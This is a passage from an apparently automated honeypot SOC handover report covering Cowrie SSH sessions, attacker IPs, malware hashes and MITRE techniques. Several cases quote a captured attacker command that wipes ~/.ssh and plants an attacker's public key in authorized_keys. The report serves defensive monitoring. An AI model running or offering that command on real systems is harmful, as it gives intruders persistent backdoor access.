| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:01:52` | `cowrie.session.connect` |
| `2026-04-21 17:01:52` | `cowrie.client.version` |
| `2026-04-21 17:01:52` | `cowrie.client.kex` |
| `2026-04-21 17:01:53` | `cowrie.login.success` |
| `2026-04-21 17:01:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d38b83cc874

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-04-21 17:02 |
| **Last Seen** | 2026-04-21 17:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:02:00` | `cowrie.session.connect` |
| `2026-04-21 17:02:00` | `cowrie.client.version` |
| `2026-04-21 17:02:00` | `cowrie.client.kex` |
| `2026-04-21 17:02:00` | `cowrie.login.success` |
| `2026-04-21 17:02:01` | `cowrie.session.params` |
| `2026-04-21 17:02:01` | `cowrie.command.input` |
| `2026-04-21 17:02:01` | `cowrie.command.failed` |
| `2026-04-21 17:02:01` | `cowrie.log.closed` |
| `2026-04-21 17:02:01` | `cowrie.session.params` |
| `2026-04-21 17:02:01` | `cowrie.command.input` |
| `2026-04-21 17:02:01` | `cowrie.session.file_download` |
| `2026-04-21 17:02:01` | `cowrie.log.closed` |
| `2026-04-21 17:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3fcd699257e4

| Field | Detail |
|---|---|
| **Source IP** | `34.91.0[.]68` |
| **First Seen** | 2026-04-21 17:02 |
| **Last Seen** | 2026-04-21 17:02 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:02:03` | `cowrie.session.connect` |
| `2026-04-21 17:02:03` | `cowrie.client.version` |
| `2026-04-21 17:02:04` | `cowrie.client.kex` |
| `2026-04-21 17:02:04` | `cowrie.login.success` |
| `2026-04-21 17:02:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.91.0[.]68` to AbuseIPDB if not already reported
- [ ] Block `34.91.0[.]68` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b1e9dbfd1db

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:02 |
| **Last Seen** | 2026-04-21 17:02 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:02:41` | `cowrie.session.connect` |
| `2026-04-21 17:02:41` | `cowrie.client.version` |
| `2026-04-21 17:02:42` | `cowrie.client.kex` |
| `2026-04-21 17:02:42` | `cowrie.login.success` |
| `2026-04-21 17:02:43` | `cowrie.session.params` |
| `2026-04-21 17:02:43` | `cowrie.command.input` |
| `2026-04-21 17:02:43` | `cowrie.command.failed` |
| `2026-04-21 17:02:43` | `cowrie.log.closed` |
| `2026-04-21 17:02:43` | `cowrie.session.params` |
| `2026-04-21 17:02:43` | `cowrie.command.input` |
| `2026-04-21 17:02:44` | `cowrie.session.file_download` |
| `2026-04-21 17:02:44` | `cowrie.log.closed` |
| `2026-04-21 17:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d4c1b568958

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:02 |
| **Last Seen** | 2026-04-21 17:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:02:46` | `cowrie.session.connect` |
| `2026-04-21 17:02:46` | `cowrie.client.version` |
| `2026-04-21 17:02:46` | `cowrie.client.kex` |
| `2026-04-21 17:02:47` | `cowrie.login.success` |
| `2026-04-21 17:02:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-54be4a7bf4d7

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]112` |
| **First Seen** | 2026-04-21 17:05 |
| **Last Seen** | 2026-04-21 17:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:05:02` | `cowrie.session.connect` |
| `2026-04-21 17:05:02` | `cowrie.client.version` |
| `2026-04-21 17:05:02` | `cowrie.client.kex` |
| `2026-04-21 17:05:03` | `cowrie.login.success` |
| `2026-04-21 17:05:03` | `cowrie.session.params` |
| `2026-04-21 17:05:03` | `cowrie.command.input` |
| `2026-04-21 17:05:03` | `cowrie.command.failed` |
| `2026-04-21 17:05:03` | `cowrie.log.closed` |
| `2026-04-21 17:05:03` | `cowrie.session.params` |
| `2026-04-21 17:05:03` | `cowrie.command.input` |
| `2026-04-21 17:05:03` | `cowrie.session.file_download` |
| `2026-04-21 17:05:03` | `cowrie.log.closed` |
| `2026-04-21 17:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]112` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]112` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f488acea1ec

| Field | Detail |
|---|---|
| **Source IP** | `14.103.112[.]112` |
| **First Seen** | 2026-04-21 17:05 |
| **Last Seen** | 2026-04-21 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:05:05` | `cowrie.session.connect` |
| `2026-04-21 17:05:05` | `cowrie.client.version` |
| `2026-04-21 17:05:06` | `cowrie.client.kex` |
| `2026-04-21 17:05:06` | `cowrie.login.success` |
| `2026-04-21 17:05:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.112[.]112` to AbuseIPDB if not already reported
- [ ] Block `14.103.112[.]112` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fd17d72ea3e5

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:06 |
| **Last Seen** | 2026-04-21 17:06 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:06:12` | `cowrie.session.connect` |
| `2026-04-21 17:06:12` | `cowrie.client.version` |
| `2026-04-21 17:06:12` | `cowrie.client.kex` |
| `2026-04-21 17:06:13` | `cowrie.login.success` |
| `2026-04-21 17:06:13` | `cowrie.session.params` |
| `2026-04-21 17:06:13` | `cowrie.command.input` |
| `2026-04-21 17:06:13` | `cowrie.command.failed` |
| `2026-04-21 17:06:14` | `cowrie.log.closed` |
| `2026-04-21 17:06:14` | `cowrie.session.params` |
| `2026-04-21 17:06:14` | `cowrie.command.input` |
| `2026-04-21 17:06:14` | `cowrie.session.file_download` |
| `2026-04-21 17:06:14` | `cowrie.log.closed` |
| `2026-04-21 17:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d97f55b81b7a

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:06 |
| **Last Seen** | 2026-04-21 17:06 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:06:17` | `cowrie.session.connect` |
| `2026-04-21 17:06:17` | `cowrie.client.version` |
| `2026-04-21 17:06:17` | `cowrie.client.kex` |
| `2026-04-21 17:06:18` | `cowrie.login.success` |
| `2026-04-21 17:06:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-425a0c8a9248

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:07 |
| **Last Seen** | 2026-04-21 17:07 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:07:07` | `cowrie.session.connect` |
| `2026-04-21 17:07:07` | `cowrie.client.version` |
| `2026-04-21 17:07:07` | `cowrie.client.kex` |
| `2026-04-21 17:07:08` | `cowrie.login.success` |
| `2026-04-21 17:07:09` | `cowrie.session.params` |
| `2026-04-21 17:07:09` | `cowrie.command.input` |
| `2026-04-21 17:07:09` | `cowrie.command.failed` |
| `2026-04-21 17:07:09` | `cowrie.log.closed` |
| `2026-04-21 17:07:09` | `cowrie.session.params` |
| `2026-04-21 17:07:09` | `cowrie.command.input` |
| `2026-04-21 17:07:10` | `cowrie.session.file_download` |
| `2026-04-21 17:07:10` | `cowrie.log.closed` |
| `2026-04-21 17:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-867d532a02c6

| Field | Detail |
|---|---|
| **Source IP** | `212.156.33[.]182` |
| **First Seen** | 2026-04-21 17:07 |
| **Last Seen** | 2026-04-21 17:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-21 17:07:12` | `cowrie.session.connect` |
| `2026-04-21 17:07:12` | `cowrie.client.version` |
| `2026-04-21 17:07:12` | `cowrie.client.kex` |
| `2026-04-21 17:07:13` | `cowrie.login.success` |
| `2026-04-21 17:07:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `212.156.33[.]182` to AbuseIPDB if not already reported
- [ ] Block `212.156.33[.]182` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `118.35.127[.]66` | **26** | 2026-04-21 16:26 | 2026-04-21 17:01 | 0m | 26 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `103.182.132[.]154` | **18** | 2026-04-21 16:36 | 2026-04-21 16:58 | 0m | 18 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `157.245.245[.]246` | **2** | 2026-04-21 16:30 | 2026-04-21 16:30 | 0m | 0 | `T1592` | 🟢 LOW |
| `1.214.179[.]202` | 1 | 2026-04-21 15:32 | 2026-04-21 15:32 | 30s | 0 | `T1592` | 🟢 LOW |
| `103.40.13[.]4` | 1 | 2026-04-21 16:13 | 2026-04-21 16:13 | 30s | 0 | `T1592` | 🟢 LOW |
| `14.103.112[.]112` | 1 | 2026-04-21 17:05 | 2026-04-21 17:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `176.65.148[.]141` | 1 | 2026-04-21 15:25 | 2026-04-21 15:26 | 29s | 0 | `T1592` | 🟢 LOW |
| `213.176.16[.]28` | 1 | 2026-04-21 16:55 | 2026-04-21 16:55 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `34.91.0[.]68` | 1 | 2026-04-21 17:02 | 2026-04-21 17:02 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `45.91.64[.]7` | 1 | 2026-04-21 16:20 | 2026-04-21 16:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `94.156.14[.]80` | 1 | 2026-04-21 15:33 | 2026-04-21 15:33 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (23 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 42/100 | 🟡 MEDIUM | **31/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 49/100 | 🟡 MEDIUM | **50/76** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `213.176.16[.]28` | NL | GLOBAL CONNECTIVITY SOLUTIONS LLP | **100** ⚠️ | 5 |
| `103.40.13[.]4` | CN | Suqian Pugongying Network Service Co.,Ltd | **100** ⚠️ | 2 |
| `157.245.245[.]246` | US | DigitalOcean, LLC | **100** ⚠️ | 16 |
| `94.156.14[.]80` | RO | Internet Utilities Europe and Asia Limited | **100** ⚠️ | 7 |
| `176.65.148[.]141` | NL | Pfcloud UG | **100** ⚠️ | 11 |
| `14.103.112[.]112` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 50 |
| `1.214.179[.]202` | KR | LG Uplus | **100** ⚠️ | 28 |
| `45.91.64[.]7` | RU | F6 | **100** ⚠️ | 50 |
| `103.182.132[.]154` | IN | GITELENET PRIVATE LIMITED | **100** ⚠️ | 50 |
| `34.91.0[.]68` | NL | Google LLC | **100** ⚠️ | 50 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 107 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 65 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 40 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 20 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 20 |

---

## 🔕 False Positive Summary (21 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2 |
| AbuseIPDB score 17 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 18 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 115 cases |
| Tool 34  | Credential Extractor        | ✅ 105 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 4 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 15 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 21 filtered (18.3%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 15 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 23 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 40 priority case(s) shown individually · 11 recon entry/entries in table (3 group(s) consolidating 46 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-21T17:09:04Z_
